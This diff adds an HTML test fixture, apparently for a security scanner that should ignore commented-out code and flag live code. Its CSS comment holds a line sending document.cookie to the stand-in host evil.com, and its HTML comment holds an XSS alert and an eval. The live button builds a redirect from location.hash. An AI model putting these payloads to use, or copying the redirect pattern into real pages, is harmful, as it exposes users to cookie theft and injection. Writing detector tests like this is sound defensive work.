@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        /* 
+         * TEST 1: CSS BLOCK COMMENT (SKIP)
+         * Everything here should be ignored.
+         * body { background: url("http://evil.com/logger.php?c=" + document.cookie); }
+         */
+        
+        .active-layout {
+            /* Line comment in CSS - Skip */
+            margin: 20px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <!-- 
+        TEST 2: HTML COMMENT (SKIP)
+        The agent must NOT flag the XSS or the eval inside this block.
+        <script>alert(document.cookie);</script>
+        <div onclick="eval('vulnerable_code')">Click Me</div>
+    -->
+    
+    <div class="content">
+        <h1>Account Dashboard</h1>
+        
+        <!-- TEST 3: ACTIVE CODE (REPORT) -->
+        <!-- This is active code inside an HTML attribute. It SHOULD be reported. -->
+        <button onclick="document.location = 'http://my-site.com/redirect?url=' + location.hash">
+            Secure Logout
+        </button>
+    </div>
+</body>
+</html>
